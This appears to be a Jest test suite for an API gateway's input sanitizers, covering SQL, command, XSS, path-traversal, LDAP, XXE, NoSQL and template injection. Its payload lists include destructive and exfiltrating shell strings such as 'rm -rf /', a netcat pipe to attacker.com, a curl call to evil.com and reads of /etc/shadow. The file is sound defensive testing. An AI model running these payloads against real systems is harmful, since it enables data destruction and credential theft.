/**
 * Security Tests: Injection Attacks (SQL, Command, XSS)
 * Tests for SQL injection, command injection, XSS, and other injection vulnerabilities
 */

import {
  APIGateway,
  APIRequest,
  HTTPMethod,
  InputSanitizer,
  ValidationMiddleware,
  RequestValidator,
  RateLimitStrategy,
} from '../../../src/api/APIGateway';
import { AuthenticationSystem, RBACSystem, AuditLogger } from '../../../src/security/MEGA_SecurityAuthentication';

describe('Security Tests: Injection Attacks', () => {
  let gateway: APIGateway;
  let authSystem: AuthenticationSystem;
  let rbacSystem: RBACSystem;
  let auditLogger: AuditLogger;

  beforeEach(() => {
    authSystem = new AuthenticationSystem();
    rbacSystem = new RBACSystem();
    auditLogger = new AuditLogger();
    gateway = new APIGateway(authSystem, rbacSystem, auditLogger, {
      enableErrorHandling: true,
      errorHandlingOptions: {
        includeStackTrace: false,
      },
    });
  });

  describe('SQL Injection Attacks', () => {
    it('should block basic SQL injection attempts in query parameters', async () => {
      const endpoint = gateway.registerEndpoint({
        path: '/api/users',
        method: HTTPMethod.GET,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { users: [] },
        }),
        middleware: [ValidationMiddleware.createSQLInjectionProtection()],
        tags: ['users'],
      });

      const maliciousPayloads = [
        "1' OR '1'='1",
        "1' OR 1=1--",
        "admin'--",
        "' OR 'x'='x",
        "1; DROP TABLE users--",
        "' UNION SELECT * FROM passwords--",
        "1' AND '1'='1",
      ];

      for (const payload of maliciousPayloads) {
        const request: APIRequest = {
          method: HTTPMethod.GET,
          path: '/api/users',
          headers: {},
          query: { id: payload },
          params: {},
          body: null,
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        expect(response.statusCode).toBe(400);
        expect(response.body.error).toContain('malicious input');
      }
    });

    it('should block SQL injection in POST body', async () => {
      gateway.registerEndpoint({
        path: '/api/users',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 201,
          headers: {},
          body: { success: true },
        }),
        middleware: [ValidationMiddleware.createSQLInjectionProtection()],
        tags: ['users'],
      });

      const request: APIRequest = {
        method: HTTPMethod.POST,
        path: '/api/users',
        headers: { 'content-type': 'application/json' },
        query: {},
        params: {},
        body: {
          username: "admin'--",
          email: "test@example.com",
          password: "' OR '1'='1",
        },
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      expect(response.statusCode).toBe(400);
      expect(response.body.error).toContain('malicious input');
    });

    it('should block SQL injection with UNION attacks', async () => {
      gateway.registerEndpoint({
        path: '/api/search',
        method: HTTPMethod.GET,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { results: [] },
        }),
        middleware: [ValidationMiddleware.createSQLInjectionProtection()],
        tags: ['search'],
      });

      const request: APIRequest = {
        method: HTTPMethod.GET,
        path: '/api/search',
        headers: {},
        query: { q: "' UNION SELECT username, password FROM users--" },
        params: {},
        body: null,
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      expect(response.statusCode).toBe(400);
    });

    it('should sanitize SQL dangerous characters', () => {
      const dangerous = "admin'; DROP TABLE users; --";
      const sanitized = InputSanitizer.sanitizeSQL(dangerous);

      expect(sanitized).not.toContain("';");
      expect(sanitized).toContain("''");
    });

    it('should block nested SQL injection attempts', async () => {
      gateway.registerEndpoint({
        path: '/api/nested',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { success: true },
        }),
        middleware: [ValidationMiddleware.createSQLInjectionProtection()],
        tags: ['nested'],
      });

      const request: APIRequest = {
        method: HTTPMethod.POST,
        path: '/api/nested',
        headers: {},
        query: {},
        params: {},
        body: {
          user: {
            profile: {
              bio: "' OR 1=1--",
            },
          },
        },
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      expect(response.statusCode).toBe(400);
    });
  });

  describe('Command Injection Attacks', () => {
    it('should block basic command injection attempts', async () => {
      gateway.registerEndpoint({
        path: '/api/execute',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { result: 'executed' },
        }),
        middleware: [ValidationMiddleware.createCommandInjectionProtection()],
        tags: ['execute'],
      });

      const maliciousCommands = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test `whoami`',
        'test $(cat /etc/shadow)',
        'test & curl http://evil.com',
        'test\nwhoami',
      ];

      for (const command of maliciousCommands) {
        const request: APIRequest = {
          method: HTTPMethod.POST,
          path: '/api/execute',
          headers: {},
          query: {},
          params: {},
          body: { command },
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        const sanitized = response.body?.command || '';

        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
      }
    });

    it('should remove shell metacharacters', () => {
      const dangerous = 'test; ls -la && cat /etc/passwd';
      const sanitized = InputSanitizer.sanitizeCommand(dangerous);

      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('&&');
      expect(sanitized).not.toContain('|');
    });

    it('should block command injection in file paths', async () => {
      gateway.registerEndpoint({
        path: '/api/files/:filename',
        method: HTTPMethod.GET,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { content: 'file content' },
        }),
        middleware: [ValidationMiddleware.createCommandInjectionProtection()],
        tags: ['files'],
      });

      const request: APIRequest = {
        method: HTTPMethod.GET,
        path: '/api/files/test.txt',
        headers: {},
        query: { path: '/tmp; cat /etc/passwd' },
        params: { filename: 'test.txt' },
        body: null,
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      const sanitized = response.body?.query?.path || '';
      expect(sanitized).not.toContain(';');
    });
  });

  describe('XSS (Cross-Site Scripting) Attacks', () => {
    it('should sanitize basic XSS attempts', async () => {
      gateway.registerEndpoint({
        path: '/api/comments',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 201,
          headers: {},
          body: { comment: req.body },
        }),
        middleware: [ValidationMiddleware.createXSSProtection()],
        tags: ['comments'],
      });

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
      ];

      for (const payload of xssPayloads) {
        const request: APIRequest = {
          method: HTTPMethod.POST,
          path: '/api/comments',
          headers: {},
          query: {},
          params: {},
          body: { text: payload },
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        const sanitized = response.body?.comment?.text || '';

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('javascript:');
      }
    });

    it('should sanitize HTML in input by default', () => {
      const dangerous = '<script>alert("XSS")</script>Hello';
      const sanitized = InputSanitizer.sanitizeHTML(dangerous);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toContain('Hello');
    });

    it('should allow safe HTML when configured', () => {
      const html = '<p>Hello <strong>World</strong></p>';
      const sanitized = InputSanitizer.sanitizeHTML(html, {
        allowHTML: true,
        allowedTags: ['p', 'strong'],
        allowedAttributes: {},
      });

      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('<strong>');
    });

    it('should block event handler attributes', () => {
      const dangerous = '<div onclick="alert(1)">Click me</div>';
      const sanitized = InputSanitizer.sanitizeHTML(dangerous);

      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
    });

    it('should sanitize nested objects for XSS', async () => {
      gateway.registerEndpoint({
        path: '/api/profile',
        method: HTTPMethod.PUT,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: req.body,
        }),
        middleware: [ValidationMiddleware.createXSSProtection()],
        tags: ['profile'],
      });

      const request: APIRequest = {
        method: HTTPMethod.PUT,
        path: '/api/profile',
        headers: {},
        query: {},
        params: {},
        body: {
          user: {
            name: 'Test',
            bio: '<script>alert("XSS")</script>',
            website: '<iframe src="javascript:alert(1)">',
          },
        },
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      expect(response.body.user.bio).not.toContain('<script>');
      expect(response.body.user.website).not.toContain('javascript:');
    });

    it('should add XSS protection headers', async () => {
      gateway.registerEndpoint({
        path: '/api/public',
        method: HTTPMethod.GET,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { data: 'public' },
        }),
        middleware: [ValidationMiddleware.createXSSProtection()],
        tags: ['public'],
      });

      const request: APIRequest = {
        method: HTTPMethod.GET,
        path: '/api/public',
        headers: {},
        query: {},
        params: {},
        body: null,
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      expect(response.headers['X-Content-Type-Options']).toBe('nosniff');
      expect(response.headers['X-Frame-Options']).toBe('DENY');
      expect(response.headers['X-XSS-Protection']).toBe('1; mode=block');
      expect(response.headers['Content-Security-Policy']).toContain("default-src 'self'");
    });
  });

  describe('Path Traversal Attacks', () => {
    it('should block directory traversal attempts', async () => {
      gateway.registerEndpoint({
        path: '/api/files/:path',
        method: HTTPMethod.GET,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { path: req.params.path },
        }),
        middleware: [ValidationMiddleware.createPathTraversalProtection()],
        tags: ['files'],
      });

      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..;/..;/..;/etc/passwd',
      ];

      for (const maliciousPath of maliciousPaths) {
        const request: APIRequest = {
          method: HTTPMethod.GET,
          path: '/api/files/test',
          headers: {},
          query: { file: maliciousPath },
          params: { path: maliciousPath },
          body: null,
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        const sanitizedParam = response.body?.path || '';
        const sanitizedQuery = response.body?.query?.file || '';

        expect(sanitizedParam).not.toContain('..');
        expect(sanitizedQuery).not.toContain('..');
      }
    });

    it('should sanitize path traversal sequences', () => {
      const dangerous = '../../../etc/passwd';
      const sanitized = InputSanitizer.sanitizePath(dangerous);

      expect(sanitized).not.toContain('..');
      expect(sanitized).not.toMatch(/^\//);
    });

    it('should remove null bytes from paths', () => {
      const dangerous = '/valid/path\x00/../../etc/passwd';
      const sanitized = InputSanitizer.sanitizePath(dangerous);

      expect(sanitized).not.toContain('\x00');
    });

    it('should normalize path separators', () => {
      const windowsPath = 'folder\\..\\..\\file.txt';
      const sanitized = InputSanitizer.sanitizePath(windowsPath);

      expect(sanitized).not.toContain('\\');
      expect(sanitized).not.toContain('..');
    });
  });

  describe('LDAP Injection', () => {
    it('should sanitize LDAP special characters', async () => {
      gateway.registerEndpoint({
        path: '/api/ldap/search',
        method: HTTPMethod.GET,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { results: [] },
        }),
        middleware: [ValidationMiddleware.createXSSProtection()],
        tags: ['ldap'],
      });

      const ldapPayloads = [
        '*',
        '(uid=*)',
        '(&(uid=admin)(userPassword=*))',
        '(|(uid=admin)(uid=*))',
      ];

      for (const payload of ldapPayloads) {
        const request: APIRequest = {
          method: HTTPMethod.GET,
          path: '/api/ldap/search',
          headers: {},
          query: { filter: payload },
          params: {},
          body: null,
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        // Should sanitize or validate LDAP special chars
        expect(response.statusCode).toBeLessThan(500);
      }
    });
  });

  describe('XML/XXE Injection', () => {
    it('should reject XML with external entity references', async () => {
      gateway.registerEndpoint({
        path: '/api/xml',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: { processed: true },
        }),
        middleware: [],
        tags: ['xml'],
      });

      const xxePayload = `<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>`;

      const request: APIRequest = {
        method: HTTPMethod.POST,
        path: '/api/xml',
        headers: { 'content-type': 'application/xml' },
        query: {},
        params: {},
        body: xxePayload,
        ip: '192.168.1.1',
      };

      const response = await gateway.handleRequest(request);
      // Should not process external entities
      expect(response.body).not.toContain('root:');
    });
  });

  describe('NoSQL Injection', () => {
    it('should sanitize MongoDB operator injections', async () => {
      gateway.registerEndpoint({
        path: '/api/nosql/query',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: req.body,
        }),
        middleware: [ValidationMiddleware.createXSSProtection()],
        tags: ['nosql'],
      });

      const nosqlPayloads = [
        { username: { $ne: null } },
        { username: { $gt: '' } },
        { $where: 'this.username == "admin"' },
        { username: { $regex: '.*' } },
      ];

      for (const payload of nosqlPayloads) {
        const request: APIRequest = {
          method: HTTPMethod.POST,
          path: '/api/nosql/query',
          headers: {},
          query: {},
          params: {},
          body: payload,
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        // Should sanitize operator keys
        const body = JSON.stringify(response.body);
        expect(body).not.toContain('$ne');
        expect(body).not.toContain('$gt');
        expect(body).not.toContain('$where');
      }
    });
  });

  describe('Template Injection', () => {
    it('should sanitize template expression injections', async () => {
      gateway.registerEndpoint({
        path: '/api/render',
        method: HTTPMethod.POST,
        handler: async (req) => ({
          statusCode: 200,
          headers: {},
          body: req.body,
        }),
        middleware: [ValidationMiddleware.createXSSProtection()],
        tags: ['render'],
      });

      const templatePayloads = [
        '{{constructor.constructor("return process")()}}',
        '${7*7}',
        '<%= system("whoami") %>',
        '{{config.items}}',
      ];

      for (const payload of templatePayloads) {
        const request: APIRequest = {
          method: HTTPMethod.POST,
          path: '/api/render',
          headers: {},
          query: {},
          params: {},
          body: { template: payload },
          ip: '192.168.1.1',
        };

        const response = await gateway.handleRequest(request);
        // Should not execute template expressions
        expect(response.body.template).not.toContain('constructor');
      }
    });
  });
});
